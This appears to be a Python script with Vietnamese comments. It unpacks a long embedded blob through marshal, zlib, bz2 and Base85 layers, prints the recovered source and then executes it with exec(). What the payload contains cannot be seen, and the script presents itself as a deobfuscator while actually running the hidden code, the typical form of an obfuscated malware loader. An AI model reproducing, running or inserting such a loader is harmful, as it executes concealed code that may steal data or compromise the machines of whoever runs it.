import base64
import bz2
import zlib
import marshal

def deobfuscate(marshaled_code):
    try:
        # Giải mã Marshal
        compressed_zlib = marshal.loads(marshaled_code)
        
        # Giải nén Zlib
        compressed_bz2 = zlib.decompress(compressed_zlib)
        
        # Giải nén BZ2
        encoded_data = bz2.decompress(compressed_bz2)
        
        # Giải mã Base85
        source_code = base64.a85decode(encoded_data).decode('utf-8')
        
        # In ra mã nguồn đã giải mã
        print("[*] Mã nguồn gốc:")
        print(source_code)
        
        # Thực thi mã nguồn gốc
        exec(source_code)
    except Exception as e:
        print(f"[!] Lỗi trong quá trình giải mã: {e}")

# Đây là mã đã được mã hóa, nén và Marshal
marshaled_code = b'6<\\%_0gSqh;d")7;Qp6,FasGks8W-!s8W-!s8W-!s8W-!s8W-!s8W-!s8W-!s8W,_aoh*9mp5VMpKm=#:%*B%HeY0@gXC)Hhg9:UgUF\\>O*A>*_=)a.GM`!oDX-KQn#kPqDYJR>?McpX](EPXbBr*sqpON=[J.B-pSRD!]l1C7X1`_(HX0EQhgBQpldb[cF]%V<mJ"q0p2@RT]3GTt]C/\\MQX>/RhcmS$f5<d0IJ3Bgmq1><=n_aLICmbf]2s@Hc`]EYhcSal&$EY$hdVS7h`IEB\\FK:cI4aj<IJ:8DVY@7Lf,ig2^%]84^/\\FeDQ%_gla`:mh#$Q3pYO5BD=`2DS%SIl[6*cZ:VPFiSsa;9qn9]+Vr$,kN/kLCmsB992kGeKGJ<elC9Mu4F)JU8?KV+IGC$HX0:f\\cpLS2Shf!gda\'J/Gml\'RaRbmMIf@@(<pL`$LF)/MacY(i&HDe1>D`<*\\h4JK;-f2S\\fR)@sh=UHN[o9^!Wh4V7dap\\>T)6.\'QF5P^l<AV?hf^a2j3ua\'pWn/P4nl@3f=\'6(HZs*aKg#-@Hgc<b\\%_4`h,g$<n#rUkhV3*iIFe)8T$>Wk]A%P]]Bu3%hbQ2gIJ3Oip!Kr!kJ$[NpMJf9HbJ!Ym6:9JC%$6>^%OO5a3VAS#@?fd\\aNeZ);dXS]B5j>h=nU*SbKTW^@q3Tflt\'an"2W)^"q0\'bO;\\3II;OOT\'a5*42(*0CCJJ]F1q$d^"m%)hR<%5HdB@VhJSB;B2;lYDdI3Wqn:3iIJ8!\\^%Z[Cf=S_?hcsoe%G(EES\\DSjD8\'?Q5/+_fHgeT(Dmf#em.\\!Go;^qs?MD!YDVNaNbO;mNI.(tFp"$XV]q4uMgM>6`>M`6Ef]RI$4n#iPpYE1@YIf?Uf<;.MhY4^So=ho\'hg=0@ekWC(o5AccMdtAPpGM[?pV+%IfAB*4o=OF(f<7gCII/YY^3R23?Z2A#IG[\'QcA/T!Df_\\G1HauMHM5hPkJu0J]_;3ZICn=,mQL0uqKpgUguNh>?ME3WmCgeh^?6QLWGUO2](\\DF]@urGo<uB&B4!fM^$eU5QVW#\'h`J;qH[Y3]e*Fa)l!f^fh9Wdkp$6C?Hag*RlkeD[n$2;hhfh9Q]tWm^=1_\\kkF90R^=hrK^AE75?Y6@BID,>U4mo*2Z[;-.NpZQ.GA6[;S)-4`)t0?R^AE=]JA.WLX1MSBha&o4pYP?k[s)o^^@Tgc]3Vo\'GBNQ$T7-13G\'s/`]^3,X[njS*f=glbHgc:LD`P80?!h+!D`[3rSEmfUD0\'UlmuH]-hYH!<pKlMLc@+^(DQ\\c/q:F(+D#8S8p:K_clau!IhW6[t^AIA+.lU\\WpKK:XD`teb^@gnq:Nl/R1-;tsI9i2Ele=JVpKqieYE*SO%sm[3mOc/RYHI9MBsI?pqqlhbhV*>EnU%s1:RA2-CAR>SoA-qrgV3-#Y<MDjh"SG:hfmnRYI<8Y]cG_<mdH2!^%M*oEW]M?f"Tbj]C&so\\^"K(_=)0hhgKjZmp:-Yp$:GJp:bG3^>A;G?J_7;le?[\\p!0.U]"L0$qsE"JfA!(V]sg[0`pZ(R[J&DM:-7oMd_<Gc]?S\':^%X.mme#g@7df[4GGfZ?He[E%HJ@k6o\\Scfhg:s.I<X2SpTM\'/[q:r_qTENS`q2@Klb;Q<^#*/nDi<EJmH`2l]euo!hd:TU[J+Tdn$_re]?]g"p:,#/^:ZYr>5*>kY&W"*n%JInet1W6pU,3N]6i+1f-fG3NO/)_\\)2DA>APg-D9[:\\;a\'ScVe=k5HJNntBEN$\\l0Wo:Dfoos4nhn@Sm$\'BqsV)E]\\_7eGLtTXp<UFmflQV0YIED9SK>Dtg[;7NII?CkGMd'

deobfuscate(marshaled_code)
